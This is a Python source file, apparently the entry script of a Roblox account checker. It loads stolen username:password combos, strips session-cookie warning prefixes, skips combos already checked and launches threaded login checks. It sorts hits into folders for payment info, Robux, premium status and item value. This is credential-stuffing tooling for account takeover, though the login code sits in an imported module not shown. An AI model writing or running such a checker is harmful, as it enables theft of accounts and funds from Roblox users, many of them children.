import sys, os
import random
from output import Output
from thread_lock import lock
from threading import Thread
from counter import counter
from roblox import Roblox
from util import Util

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

try:
    os.mkdir("output")
except:
    pass

try:
    os.mkdir("output/payment_info")
except:
    pass

try:
    os.mkdir("output/pending")
except:
    pass

try:
    os.mkdir("output/premium")
except:
    pass

try:
    os.mkdir("output/rap")
except:
    pass

try:
    os.mkdir("output/robux")
except:
    pass

try:
    os.mkdir("output/summary")
except:
    pass

try:
    os.mkdir("output/users")
except:
    pass

threading_lock = lock

config = Util.get_config()

THREAD_AMOUNT = config["threads"]

def load_combo_set(path: str, include_mail: bool = False) -> set:
    combos = set()
    if not os.path.exists(path):
        return combos

    with open(path, "r", encoding="utf-8", errors="replace") as file:
        for line in file:
            raw = line.strip()
            if not raw:
                continue
            parts = raw.split(":")
            if len(parts) < 2:
                continue
            user = parts[0]
            password = parts[1]
            combos.add(f"{user}:{password}")
            if include_mail and len(parts) >= 3:
                mail = parts[2]
                combos.add(f"{mail}:{password}")

    return combos

def clean_accounts() -> tuple[list, set, int, int]:
    checked = set()
    checked.update(load_combo_set("output/valid.txt"))
    checked.update(load_combo_set("output/invalid.txt"))
    checked.update(load_combo_set("output/originalcombo.txt", include_mail=True))

    accounts_path = "input/accounts.txt"
    if not os.path.exists(accounts_path):
        return [], checked, 0, 0

    cleaned = []
    seen = set()
    total = 0
    removed = 0
    with open(accounts_path, "r", encoding="utf-8", errors="replace") as file:
        for line in file:
            raw = line.strip()
            if not raw:
                continue
            if raw in seen:
                continue
            seen.add(raw)
            total += 1
            parts = raw.split(":")
            if len(parts) >= 3 and parts[2].startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
                raw = f"{parts[0]}:{parts[1]}"
                parts = raw.split(":")
            if len(parts) < 2:
                cleaned.append(raw)
                continue
            combo = f"{parts[0]}:{parts[1]}"
            if combo in checked:
                removed += 1
                continue
            cleaned.append(raw)

    random.shuffle(cleaned)

    with open(accounts_path, "w", encoding="utf-8") as file:
        for line in cleaned:
            file.write(f"{line}\n")

    return [f"{line}\n" for line in cleaned], checked, total, removed

def main() -> None:
    threads = []
    accounts, checked_combos, total, removed = clean_accounts()
    if total > 0 and removed > 0:
        Output("INFO").log(f"Removed {removed} already checked account(s)")
    if total > 0:
        Output("INFO").log(f"Accounts remaining to check: {total - removed}")

    if len(accounts) <= THREAD_AMOUNT:
        for _ in range(len(accounts)):
            thread = Thread(target=Roblox(threading_lock, counter, accounts, checked_combos).check)
            thread.start()
            threads.append(thread)
    else:
        for _ in range(THREAD_AMOUNT):
            thread = Thread(target=Roblox(threading_lock, counter, accounts, checked_combos).check)
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()

    Output("SUCCESS").log("Finished checking all accounts")

if __name__ == "__main__":
    main()
